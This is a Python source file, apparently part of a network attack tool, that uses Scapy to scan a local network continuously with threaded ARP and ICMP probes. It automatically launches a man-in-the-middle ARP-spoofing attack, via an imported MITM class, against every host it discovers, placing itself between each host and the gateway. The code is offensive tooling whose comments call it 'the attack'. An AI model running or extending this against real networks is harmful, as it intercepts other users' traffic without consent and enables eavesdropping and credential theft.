from scapy.config import conf
from scapy.layers.l2 import ARP, getmacbyip
from scapy.layers.inet import TCP, IP, ICMP, Ether
from ipaddress import IPv4Network, IPv4Address
from threading import Thread
from time import sleep
from Helper import *
from Host import Host
from MITM import MITM

class Singleton(type):
    _instances = {}
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
        return cls._instances[cls]


class NetworkScan(metaclass=Singleton):                 #make this class a singleton to not be instantiated
    def __init__(self,network,interface,interval=20.0): # this is a continous network scan class default every 20 sec plus spoofing anything less than 15 sec is not possible
        self.network = IPv4Network(network)
        self.interface=interface
        self.interval = interval if isinstance(interval, float) else 20.0
        self._stopped = False
        self._local_ip = IPv4Address(conf.route.route("0.0.0.0")[1])           # get the my ip
        self._gateway_ip = IPv4Address(conf.route.route("0.0.0.0")[-1])        # get the router ip
        self._gateway_host = self._get_gateway_host(str(self._gateway_ip))     #get the mac of the router
        self._network_hosts_to_scan = {str(host) for host in self.network.hosts() if host not in (self._local_ip,self._gateway_ip)}
        self._discovered_hosts = set()  #{}
        self._spoofed_hosts = set()

    def stop_scan(self):
        self._stopped=True
        for spoofed_host in self._spoofed_hosts:
            spoofed_host.stop_attack()



    def _arp_scan(self,ip, s, timeout):
        arp_req_frame = ARP(pdst = ip)
        broadcast_ether_frame = Ether(dst = "ff:ff:ff:ff:ff:ff")
        broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
        received = srp1(s, broadcast_ether_arp_req_frame, timeout = timeout, verbose = False)
        if (received):
            discovered_host = Host(ip=received[ARP].psrc, mac=received[Ether].src)
            return discovered_host
        return False

    def _icmp_echo_scan(self,ip, s, timeout):
        icmp_req_frame = ICMP()
        ip_req_frame = IP(dst=ip)
        broadcast_ether_frame = Ether(dst = "ff:ff:ff:ff:ff:ff")
        broadcast_ip_icmp_req_frame = broadcast_ether_frame / ip_req_frame / icmp_req_frame
        received = srp1(s, broadcast_ip_icmp_req_frame, timeout = timeout, verbose = False)
        if (received):
            discovered_host = Host(ip=received[IP].src, mac=received[Ether].src)
            return discovered_host
        return False


    def _spoof_discovered_hosts(self):
        if self._gateway_host:         #if the gateway mac address exists
            spoofed_hosts = {mitm.target_host for mitm in self._spoofed_hosts}
            discovered_hosts = self._discovered_hosts.copy()
            hosts_to_spoof = discovered_hosts - spoofed_hosts
            for host in hosts_to_spoof:
                self._spoofed_hosts.add(MITM(host, self._gateway_host, self.interface))
        else:
            self._get_gateway_host(self._gateway_ip)   #search again for the gateway mac address
            print("trying to get the gateway host")



    #scan and add to the global discovered devices pool
    def _scan_compination(self, ip, timeout=2):
        l2_socket = get_l2socket(iface=self.interface)
        arp_found_host = self._arp_scan(ip,l2_socket,timeout)
        if not arp_found_host:
            icmp_found_host = self._icmp_echo_scan(ip,l2_socket,timeout)
            if icmp_found_host:
                self._discovered_hosts.add(icmp_found_host)
                self._network_hosts_to_scan.remove(ip)
        else:
            self._discovered_hosts.add(arp_found_host)
            self._network_hosts_to_scan.remove(ip)
        l2_socket.close()

    def start_scan(self): #start the scaning and the attack
        while not self._stopped:
            threads = list()
            network_hosts_to_scan = self._network_hosts_to_scan.copy()
            for ip in network_hosts_to_scan:
                t = Thread(target=self._scan_compination,args=(ip,))
                t.start()
                threads.append(t)
            for thread in threads:
                thread.join()
            self._spoof_discovered_hosts()
            if not self._stopped:
                sleep(self.interval)
            else:
                continue

    def _get_gateway_host(self,gateway_ip):   #gets the mac of the gateway
        for i in range(10):
            gateway_mac = getmacbyip(gateway_ip)
            if gateway_mac:
                return Host(gateway_ip, gateway_mac)
